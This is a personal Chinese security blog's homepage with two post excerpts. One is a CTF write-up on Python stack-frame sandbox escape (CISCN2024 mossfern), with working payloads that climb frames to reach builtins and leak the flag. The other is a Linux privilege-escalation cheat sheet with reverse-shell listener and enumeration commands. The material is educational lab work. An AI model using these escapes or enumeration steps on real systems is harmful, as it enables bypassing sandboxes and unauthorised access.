
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <canvas
    id="fireworks"
    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"
></canvas>
<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
<script src="/js/fireworks.min.js"></script>
<canvas
    id="background"
    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"
></canvas>
<script src="/js/background.min.js"></script>
<div id="cursor"></div>


    <meta charset="utf-8" />
    <title>Flu0r1n3の妙妙屋</title>
    <meta name="author" content="Flu0r1n3" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/amiya.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>





<script src="/js/lib/home.js"></script>

<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>FLU0R1N3の妙妙屋</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;FLU0R1N3の妙妙屋</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div id="home-head">
    <div
        id="home-background"
        ref="homeBackground"
        data-images="/images/tlxy.jpg"
    ></div>
    <div id="home-info" @click="homeClick">
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="info">
            <div class="wrap">
                <h1>Flu0r1n3の妙妙屋</h1>
                <h3>Flu0r1n3的博客</h3>
                <h5></h5>
            </div>
        </span>
    </div>
</div>
<div
    id="home-posts-wrap"
    ref="homePostsWrap"
    true
>
    <div id="home-posts">
        

<div class="post">
    <a href="/2024/07/31/Python-Stack-Frame-Sandbox-Escape/">
        <h2 class="post-title">Python栈帧沙盒逃逸</h2>
    </a>
    <div class="category-and-date">
        
        <span class="category">
            <a href="/categories/Web/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Web
            </a>
        </span>
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/7/31
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <hr>
<h2 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h2><p>栈帧其实是生成器执行过程中产生的，先来了解一下生成器</p>
<p>Python的生成器是一种python语言独有的一种特性，在其他语言中是没有的。python的生成器是一种特殊的迭代器，可以逐个地产生元素，而不是一次性产生所有元素。<code>生成器的工作方式与迭代器相似，可以通过for循环或者next()函数逐个获取生成器中的元素，而且生成器还支持惰性计算，即只有在需要时才会计算下一个元素。</code></p>
<br>

<p>在python中，生成器可以用yield关键字来定义，yield 用于产生一个值，并在保留当前状态的同时暂停函数的执行。当下一次调用生成器时，函数会从上次暂停的位置继续执行，直到遇到下一个 yield 语句或者函数结束。</p>
<br>

<p><code>简单来说，生成器在被调用时遇到yield关键字就会暂停并保留当前状态，当再次被调用才往下继续执行，可以类比return，生成器用yield返回值而不用return。一个例子：</code></p>
<pre><code class="python">def f():  #定义一个生成器函数
  a = 1
  while True:
    yield a  #被调用后输出并保留状态
    a += 1
    
def plus(a,b):  #定义一个普通的函数
    c = a + b
    return c    
    
f = f()  #实例化生成器
print(next(f)) #1
print(next(f)) #2
print(next(f)) #3  

print(f)  #&lt;generator object f at 0x000001E05F614C40&gt;
print(plus)  #&lt;function plus at 0x000001E05F8391C0&gt;

#而且系统可以明显根据函数内部是否有yield关键字判断该函数是否为生成器
</code></pre>
<p>每次调用<code>f()</code>这个函数它会立即返回一个生成器对象，而不是执行函数体。然后，每次调用生成器对象的<code>__next__()</code>方法（或者使用next()函数）时，生成器会从上次暂停的位置继续执行，直到遇到下一个yield语句。<code>不怎么懂没关系，只要知道generator获取yield定义的值通过next()函数 or for循环（for循环的原理是生成器是特殊的迭代器）</code></p>
<br>

<p>总的来看，生成器有以下几个特点：</p>
<ol>
<li>语法上和函数类似：生成器函数和普通函数的定义相似，都使用def语句进行定义，差别在于，生成器使用yield语句返回值，而常规函数使用return语句返回值。</li>
<li>自动实现迭代器协议：生成器是一个特殊的迭代器，作为迭代器，解释器自动实现了迭代器协议，以便应用到迭代中（如for循环，sum函数）。由于生成器自动实现了迭代器协议，所以，我们可以调用它的next方法，并且，在没有值可以返回的时候，生成器自动产生StopIteration异常</li>
<li>执行过程的状态挂起：生成器使用yield语句返回一个值。yield语句挂起该生成器函数的状态，保留足够的信息，以便以后从它离开的地方继续执行。</li>
</ol>
<p>生成器与函数的区别：</p>
<ul>
<li>生成器函数包含一个或多个 yield 语句。</li>
<li>生成器函数在调用时，返回一个对象(迭代器) ，但不会立即开始执行。</li>
<li>生成器函数自动实现迭代器的两个魔法方法，因此可以使用next()迭代这些项。</li>
<li>生成器函数一旦创建，函数将暂停并将控制转移到调用方。</li>
<li>生成器函数的局部变量及其状态在连续调用之间被记住。</li>
<li>当生成器函数终止时，在进一步调用时自动引发 StopIteration。</li>
</ul>
<br>

<br>

<br>

<h2 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h2><p>为了节省代码量，生成器可以用表达式的形式构建，可以不用构造函数，用表达式写，但是使用圆括号而不是方括号</p>
<pre><code class="python">a=(i+1 for i in range(100))
#next(a)
for value in a:
    print(value)
</code></pre>
<br>

<br>

<br>

<h2 id="生成器的属性"><a href="#生成器的属性" class="headerlink" title="生成器的属性"></a>生成器的属性</h2><p><code>gi_code</code>: 生成器对应的code对象。</p>
<p><code>gi_frame</code>: 生成器对应的frame（栈帧）对象。</p>
<p><code>gi_running</code>: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。</p>
<p><code>gi_yieldfrom</code>：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。</p>
<p><code>gi_frame.f_locals</code>：一个字典，包含生成器当前帧的本地变量。</p>
<br>

<p>重点是<code>gi_frame</code>属性：</p>
<p><code>gi_frame</code> 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息</p>
<br>

<p>一个实例来演示如何利用生成器的gi_frame属性来获取生成器的当前栈帧信息</p>
<pre><code class="python">def generator():
  yield 1
  yield 2
  yield 3
  
gen = generator()

# 获取生成器的当前帧信息
frame = gen.gi_frame

# 输出生成器的当前帧信息
print(&quot;Local Variables:&quot;, frame.f_locals)
print(&quot;Global Variables:&quot;, frame.f_globals)
print(&quot;Code Object:&quot;, frame.f_code)
print(&quot;Instruction Pointer:&quot;, frame.f_lasti)
</code></pre>
<br>

<br>

<br>

<h2 id="栈帧（frame）"><a href="#栈帧（frame）" class="headerlink" title="栈帧（frame）"></a>栈帧（frame）</h2><p>在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。<code>每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。</code>这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p>
<br>

<p>栈帧包含了以下几个重要的属性：</p>
<p><code>f_locals</code>: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。</p>
<p><code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。</p>
<p><code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。</p>
<p><code>f_lasti</code>: 整数，表示最后执行的字节码指令的索引。</p>
<p><code>f_back</code>: 指向上一级调用栈帧的引用，用于构建调用栈。</p>
<br>

<br>

<br>

<h2 id="利用栈帧沙箱逃逸"><a href="#利用栈帧沙箱逃逸" class="headerlink" title="利用栈帧沙箱逃逸"></a>利用栈帧沙箱逃逸</h2><p>原理是主要利用<code>f_back</code> 返回上一帧进而逃逸出沙箱获取globals全局符号表</p>
<pre><code class="python">s3cr3t = &#39;lwt is fool&#39;

codes = &#39;&#39;&#39;
def waff():
  def f():
    yield g.gi_frame.f_back
  
  g = f()  #生成器
  
  frame = next(g)  #获取生成器的栈帧对象
  
  b = frame.f_back.f_back.f_globals[&#39;s3cr3t&#39;]  
  return b 
  
b = waff()

&#39;&#39;&#39;

locals=&#123;&#125;
code = compile(codes, &quot;test&quot;, &quot;exec&quot;)  #创造一个名为test的沙箱
exec(code,locals)
print(locals[&quot;b&quot;])

#运行得到s3cr3t的值
</code></pre>
<br>

<br>

<br>

<h2 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h2><ul>
<li><p>获取生成器的栈帧对象用到的是<code>next()</code>函数，也就是yield所定义的值</p>
</li>
<li><p><code>compile(codes,”test”,”exec”)</code>是创建一个名为<code>test</code>的python沙箱环境</p>
<br></li>
</ul>
<p><code>理解逃逸顺序</code></p>
<pre><code class="python">s3cr3t = &#39;lwt is fool&#39;

codes = &#39;&#39;&#39;
def waff():
  def f():
    yield g.gi_frame.f_back
  
  g = f()  #生成器
  
  frame = next(g)  #获取生成器的栈帧对象
  print(frame)
  print(frame.f_back)
  print(frame.f_back.f_back)
 

&#39;&#39;&#39;

locals=&#123;&#125;
code = compile(codes, &quot;test&quot;, &quot;exec&quot;)  #创造一个名为test的沙箱
exec(code,locals)
</code></pre>
<p><img src="https://s2.loli.net/2024/07/31/EmUf8wyCdLaNnDO.png" alt="j简单演示"></p>
<br>

<p>顺序为</p>
<pre><code class="python">f -&gt; waff -&gt; &lt;module&gt;(test) -&gt; &lt;module&gt;(taoyi.py) 
</code></pre>
<br>

<p>但是<code>yield g.gi_frame.f_back</code>并不能修改为<code>yield g.gi_frame</code></p>
<p>这样获取到的栈帧经过<code>f_back</code>后获得的是<code>None</code></p>
<br>

<p>多一个也不行，会报错，原因是多一个<code>f_back</code>会调用<code>waff()</code>再上一层的调用<code>waff()</code>的函数，但是例子里面明显<code>waff()</code>上面没有了，所以我们可以再创建一个</p>
<pre><code class="python">codes = &#39;&#39;&#39;
def Fluorine():
  def waff():
    def f():
      yield g.gi_frame.f_back

    g = f()  #生成器

    frame = next(g)  #获取生成器的栈帧对象
    print(frame)
    print(frame.f_back)
    print(frame.f_back.f_back)
    print(frame.f_back.f_back.f_back)
    

  waff()
Fluorine()  
&#39;&#39;&#39;

locals = &#123;&#125;
code = compile(codes, &quot;test&quot;, &quot;exec&quot;)  # 创造一个名为test的沙箱
exec(code, locals)

#这里的顺序为 f -&gt; waff -&gt; Fluorine -&gt; &lt;module&gt;(test) -&gt; &lt;module&gt;(taoyi.py)
</code></pre>
<p><img src="https://s2.loli.net/2024/07/31/2yKDxRET3Gu8zWM.png" alt="多层f_back"></p>
<p><br><br></p>
<br>

<h2 id="globals中的-builtins-字段"><a href="#globals中的-builtins-字段" class="headerlink" title="globals中的__builtins__字段"></a>globals中的__builtins__字段</h2><p><code>__builtins__</code>模块是 Python 解释器启动时自动加载的，其中包含了一系列内置函数、异常和其他内置对象。使用 <code>dir(__builtins__)</code> 来查看所有可用的内置函数和异常的列表</p>
<p><img src="https://s2.loli.net/2024/07/31/HCMO3NzoiFthc2D.png" alt="builitins.png"></p>
<br>

<br>

<br>

<h2 id="例题：CISCN2024-mossfern"><a href="#例题：CISCN2024-mossfern" class="headerlink" title="例题：CISCN2024 mossfern"></a>例题：CISCN2024 mossfern</h2><p>用ctfshow复现的，但是没有前端环境，比赛的时候是有提交框提交python代码的，这里让我们对&#x2F;run路由传json数据，同时给了我们两个附件</p>
<br>

<p><strong>main.py</strong></p>
<pre><code class="python">import os
import subprocess
from flask import Flask, request, jsonify
from uuid import uuid1

app = Flask(__name__)

runner = open(&quot;/app/runner.py&quot;, &quot;r&quot;, encoding=&quot;UTF-8&quot;).read()
flag = open(&quot;/flag&quot;, &quot;r&quot;, encoding=&quot;UTF-8&quot;).readline().strip()

@app.post(&quot;/run&quot;)
def run():
    id = str(uuid1())
    try:
        data = request.json
        open(f&quot;/app/uploads/&#123;id&#125;.py&quot;, &quot;w&quot;, encoding=&quot;UTF-8&quot;).write(
            runner.replace(&quot;THIS_IS_SEED&quot;, flag).replace(&quot;THIS_IS_TASK_RANDOM_ID&quot;, id))
        open(f&quot;/app/uploads/&#123;id&#125;.txt&quot;, &quot;w&quot;, encoding=&quot;UTF-8&quot;).write(data.get(&quot;code&quot;, &quot;&quot;))
        run = subprocess.run(
            [&#39;python&#39;, f&quot;/app/uploads/&#123;id&#125;.py&quot;],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=3
        )
        result = run.stdout.decode(&quot;utf-8&quot;)
        error = run.stderr.decode(&quot;utf-8&quot;)
        print(result, error)

        if os.path.exists(f&quot;/app/uploads/&#123;id&#125;.py&quot;):
            os.remove(f&quot;/app/uploads/&#123;id&#125;.py&quot;)
        if os.path.exists(f&quot;/app/uploads/&#123;id&#125;.txt&quot;):
            os.remove(f&quot;/app/uploads/&#123;id&#125;.txt&quot;)
        return jsonify(&#123;
            &quot;result&quot;: f&quot;&#123;result&#125;\\n&#123;error&#125;&quot;
        &#125;)
    except:
        if os.path.exists(f&quot;/app/uploads/&#123;id&#125;.py&quot;):
            os.remove(f&quot;/app/uploads/&#123;id&#125;.py&quot;)
        if os.path.exists(f&quot;/app/uploads/&#123;id&#125;.txt&quot;):
            os.remove(f&quot;/app/uploads/&#123;id&#125;.txt&quot;)
        return jsonify(&#123;
            &quot;result&quot;: &quot;None&quot;
        &#125;)

if __name__ == &quot;__main__&quot;:
    app.run(&quot;0.0.0.0&quot;, 5000)
</code></pre>
<br>

<br>

<p><strong>runner.py</strong></p>
<pre><code class="python">def source_simple_check(source):

    &quot;&quot;&quot;
    Check the source with pure string in string, prevent dangerous strings
    :param source: source code
    :return: None
    &quot;&quot;&quot;

    from sys import exit
    from builtins import print

    try:
        source.encode(&quot;ascii&quot;)
    except UnicodeEncodeError:
        print(&quot;non-ascii is not permitted&quot;)
        exit()

    for i in [&quot;__&quot;, &quot;getattr&quot;, &quot;exit&quot;]:
        if i in source.lower():
            print(i)
            exit()

def block_wrapper():
    &quot;&quot;&quot;
    Check the run process with sys.audithook, no dangerous operations should be conduct
    :return: None
    &quot;&quot;&quot;

    def audit(event, args):

        from builtins import str, print
        import os

        for i in [&quot;marshal&quot;, &quot;__new__&quot;, &quot;process&quot;, &quot;os&quot;, &quot;sys&quot;, &quot;interpreter&quot;, &quot;cpython&quot;, &quot;open&quot;, &quot;compile&quot;, &quot;gc&quot;]:
            if i in (event + &quot;&quot;.join(str(s) for s in args)).lower():
                print(i)
                os._exit(1)
    return audit

def source_opcode_checker(code):
    &quot;&quot;&quot;
    Check the source in the bytecode aspect, no methods and globals should be load
    :param code: source code
    :return: None
    &quot;&quot;&quot;

    from dis import dis
    from builtins import str
    from io import StringIO
    from sys import exit

    opcodeIO = StringIO()
    dis(code, file=opcodeIO)
    opcode = opcodeIO.getvalue().split(&quot;\\n&quot;)
    opcodeIO.close()
    for line in opcode:
        if any(x in str(line) for x in [&quot;LOAD_GLOBAL&quot;, &quot;IMPORT_NAME&quot;, &quot;LOAD_METHOD&quot;]):
            if any(x in str(line) for x in [&quot;randint&quot;, &quot;randrange&quot;, &quot;print&quot;, &quot;seed&quot;]):
                break
            print(&quot;&quot;.join([x for x in [&quot;LOAD_GLOBAL&quot;, &quot;IMPORT_NAME&quot;, &quot;LOAD_METHOD&quot;] if x in str(line)]))
            exit()

if __name__ == &quot;__main__&quot;:

    from builtins import open
    from sys import addaudithook
    from contextlib import redirect_stdout
    from random import randint, randrange, seed
    from io import StringIO
    from random import seed
    from time import time

    source = open(f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;, &quot;r&quot;).read()
    source_simple_check(source)
    source_opcode_checker(source)
    code = compile(source, &quot;&lt;sandbox&gt;&quot;, &quot;exec&quot;)
    addaudithook(block_wrapper())
    outputIO = StringIO()
    with redirect_stdout(outputIO):
        seed(str(time()) + &quot;THIS_IS_SEED&quot; + str(time()))
        exec(code, &#123;
            &quot;__builtins__&quot;: None,
            &quot;randint&quot;: randint,
            &quot;randrange&quot;: randrange,
            &quot;seed&quot;: seed,
            &quot;print&quot;: print
        &#125;, None)
    output = outputIO.getvalue()

    if &quot;THIS_IS_SEED&quot; in output:
        print(&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;)
        print(&quot;bad code-operation why still happened ah?&quot;)
    else:
        print(output)
</code></pre>
<p>可以看出做了很多防御手段目的是为了一个安全的python代码运行环境，主要是关键词sandbox考虑到这个栈帧沙箱逃逸（就是runner.py里面的一句创建了一个沙箱<code>code = compile(source, &quot;&lt;sandbox&gt;&quot;, &quot;exec&quot;)</code></p>
<br>

<br>

<p>runner.py中把<code>__builtins__:none</code> ，所以不能用next()来获取生成器栈帧，但是生成器是一种特殊的迭代器，可以用for语句来绕一下<code>[x for x in g][0]</code></p>
<br>

<br>

<p>简单试一下获取全局变量</p>
<pre><code class="python">import requests
import json

code = &#39;&#39;&#39;
def waff():
   def f():
     yield g.gi_frame.f_back
     
   g = f()
   frame = [x for x in g][0]

   print(frame.f_back.f_back.f_back.f_globals)   

waff()

&#39;&#39;&#39;

response = requests.post(&#39;&lt;http://f28ad523-d25c-46ae-9b70-6db5e1da364b.challenge.ctf.show/run&gt;&#39;,json=&#123;&quot;code&quot;:code&#125;)
print(response.text)
</code></pre>
<p>向上逃逸三次得到全局变量globals</p>
<p><img src="https://s2.loli.net/2024/07/31/DFHqdVJztb9kS4U.png" alt="获取globals.png"></p>
<br>

<br>

<p>得到globals我们还要得到dir这个函数来查看一个对象包含的方法属性变量等，注意过滤了双下划线，稍微绕一下<code>[&quot;_&quot;&quot;_builtins_&quot;&quot;_&quot;]</code></p>
<pre><code class="python">import requests
import json

code = &#39;&#39;&#39;
def waff():
   def f():
     yield g.gi_frame.f_back
   g = f()
   frame = [x for x in g][0]

   globals=frame.f_back.f_back.f_back.f_globals
   builtins=globals[&quot;_&quot;&quot;_builtins_&quot;&quot;_&quot;]
   dir=builtins.dir
   print(dir(globals))
waff()   

&#39;&#39;&#39;

response = requests.post(&#39;&lt;http://f28ad523-d25c-46ae-9b70-6db5e1da364b.challenge.ctf.show/run&gt;&#39;,json=&#123;&quot;code&quot;:code&#125;)
print(response.text)
</code></pre>
<p><img src="https://s2.loli.net/2024/07/31/M9JyFD3tfrI7mne.png" alt="获取builtins.png"></p>
<br>

<p>获取到<code>__builtins__</code>其实第一反应是SSTI里面调用<code>eval</code>直接执行系统命令的，但其实要调用eval要用到<code>os</code>模块但<code>runner.py</code>里面已经ban掉了，所以参考了一些大师傅们的WP</p>
<pre><code class="python">#runner.py里面的audit函数明确ban掉了os
def audit(event, args):

        from builtins import str, print
        import os

        for i in [&quot;marshal&quot;, &quot;__new__&quot;, &quot;process&quot;, &quot;os&quot;, &quot;sys&quot;, &quot;interpreter&quot;, &quot;cpython&quot;, &quot;open&quot;, &quot;compile&quot;, &quot;gc&quot;]:
            if i in (event + &quot;&quot;.join(str(s) for s in args)).lower():
                print(i)
                os._exit(1)
</code></pre>
<br>

<p>注意到main.py里面有</p>
<pre><code class="python">open(f&quot;/app/uploads/&#123;id&#125;.py&quot;, &quot;w&quot;, encoding=&quot;UTF-8&quot;).write(
            runner.replace(&quot;THIS_IS_SEED&quot;, flag).replace(&quot;THIS_IS_TASK_RANDOM_ID&quot;, id))
</code></pre>
<p>以上代码的作用是将flag变量替换为了runner文件中的THIS_IS_SEED，导致flag的值成为一个常量，只要我们逃出沙箱后用<code>f_code</code>来得到代码对象再用<code>co_consts</code>属性来查看该代码块中所用到的所有常量，就可以得到THIS_IS_SEED，也就是flag的值</p>
<br>

<p>但同时在runner.py中对输出作检测</p>
<pre><code class="python">if &quot;THIS_IS_SEED&quot; in output:
       print(&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;)
       print(&quot;bad code-operation why still happened ah?&quot;)
</code></pre>
<p>就是如果SEED作为常量在输出中就会被waf掉</p>
<br>

<p>所以我们用<code>builtins</code>的<code>str</code>函数将flag一个一个字符输出</p>
<pre><code class="python">import requests
import json

code = &#39;&#39;&#39;
def waff():
   def f():
     yield g.gi_frame.f_back
     
   g = f()
   
   frame = [x for x in g][0]

   globals = frame.f_back.f_back.f_back.f_globals
   builtins = globals[&quot;_&quot;&quot;_builtins_&quot;&quot;_&quot;]
   flag = frame.f_back.f_back.f_back.f_code.co_consts
   str = builtins.str
   flag = str(flag)
   for i in flag:
     print(i,end=&#39;&#39;)
waff()   

&#39;&#39;&#39;

response = requests.post(&#39;&lt;http://f28ad523-d25c-46ae-9b70-6db5e1da364b.challenge.ctf.show/run&gt;&#39;,json=&#123;&quot;code&quot;:code&#125;)
print(response.text)
</code></pre>
<p><img src="https://s2.loli.net/2024/07/31/OeBAZFQgr29qKGy.png" alt="getflag.png"></p>
<br>

<br>

<br>

<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13635">https://xz.aliyun.com/t/13635</a></li>
<li><a target="_blank" rel="noopener" href="https://c0rnfl0w3r.github.io/2024/06/04/CISCN2024-web%E5%A4%8D%E7%8E%B0/index.html">https://c0rnfl0w3r.github.io/2024/06/04/CISCN2024-web复现/index.html</a></li>
<li><a target="_blank" rel="noopener" href="https://mcat-e.github.io/2024/06/07/python%E5%B8%A7%E6%A0%88%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://mcat-e.github.io/2024/06/07/python帧栈沙箱逃逸/</a></li>
<li><a target="_blank" rel="noopener" href="https://zer0peach.github.io/2024/04/29/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://zer0peach.github.io/2024/04/29/python栈帧沙箱逃逸/</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/spiritx/article/details/132504456">https://blog.csdn.net/spiritx/article/details/132504456</a></li>
</ul>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/Python/" style="color: #ff7d73">Python</a>
        </span>
        
    </div>
    <a href="/2024/07/31/Python-Stack-Frame-Sandbox-Escape/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/07/21/Linux-privilege-escalation#1/">
        <h2 class="post-title">Linux提权#1</h2>
    </a>
    <div class="category-and-date">
        
        <span class="category">
            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                渗透测试
            </a>
        </span>
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/7/21
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <br>

<br>

<br>

<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>1.低权限可以通过修改可执行文件或脚本，执行时以高权限运行<br>基础权限如ugo，rwx，suid，sgid<br><br></p>
<p>2.从用户行为的角度，低权限运维人员也会输入&#x2F;储存高权限凭据<br>通过信息收集获取敏感信息可能是该高权限凭据<br><br></p>
<p>3.超越权限体系，在其上层（如内存）捕获&#x2F;修改凭据等信息</p>
<br>

<br>

<br>

<h2 id="提高终端稳定性"><a href="#提高终端稳定性" class="headerlink" title="提高终端稳定性"></a>提高终端稳定性</h2><p>命令：</p>
<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p>导入python库pty（伪终端）新建一个&#x2F;bin&#x2F;bash会话从而获取shell交互界面权限</p>
<br>

<p><code>stty raw -echo</code></p>
 <br>

<p><code>export TERM=xterm-color</code></p>
<br>

<p><code>rlwrap nc -lvnp port</code></p>
<br>

<br>

<br>

<h2 id="手工枚举"><a href="#手工枚举" class="headerlink" title="手工枚举"></a>手工枚举</h2><p>获取shell后</p>
<h3 id="1-查看当前人物"><a href="#1-查看当前人物" class="headerlink" title="1.查看当前人物"></a>1.查看当前人物</h3><p><code>whoami，id，who，w，last</code></p>
<p>last：查看最近哪些用户登录过该系统</p>
<br>

<br>

<h3 id="2-内核版本获取"><a href="#2-内核版本获取" class="headerlink" title="2.内核版本获取"></a>2.内核版本获取</h3><p><code>uname -a</code></p>
<br>

<p><code>lsb_release -a  Cat /proc/version</code></p>
<br>

<p><code>cat /etc/issue</code></p>
<br>

<p><code>hostnamectl</code></p>
<br>

<br>

<h3 id="3-ip地址、网卡信息"><a href="#3-ip地址、网卡信息" class="headerlink" title="3.ip地址、网卡信息"></a>3.ip地址、网卡信息</h3><p><code>ip a/addr</code></p>
<p><code>ip route</code></p>
<p><code>ip neigh</code></p>
<p><code>arp -a</code></p>
<p><code>ifconfig</code></p>
<br>

<br>

<h3 id="4-重要命令"><a href="#4-重要命令" class="headerlink" title="4.重要命令"></a>4.重要命令</h3><p><code>sudo -l</code>：查看当前用户是否有可以以root权限执行的命令但不需要密码（NOPASSWD）</p>
<br>

<p><code>getcap -r / 2&gt;/dev/null</code>：得到权限能力，在&#x2F;下</p>
<br>

<p><code>ls -liah</code>：列出隐藏文件并显示权限(可读、可写等)</p>
<br>

<p><code>history</code>: 列出这台机器使用过命令的历史记录</p>
<br>

<p><code>cat /etc/passwd</code>：查看用户名，以及最后是否有bash或sh权限，如果没有通常就是不怎么需要重点关注</p>
<br>

<p><code>echo $PATH</code>：查看环境变量</p>
<br>

<p><code>ps aux</code>：ps指的是显示进程，a列出所有用户，u显示启动该进程的用户，x显示没有连接到终端的进程</p>
<br>

<p><code>netstat -a</code>：显示网络端口、服务、连接情况和监听情况等</p>
<br>

<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>：查找有suid的可执行文件用于suid提权</p>
<br>

<br>

<br>

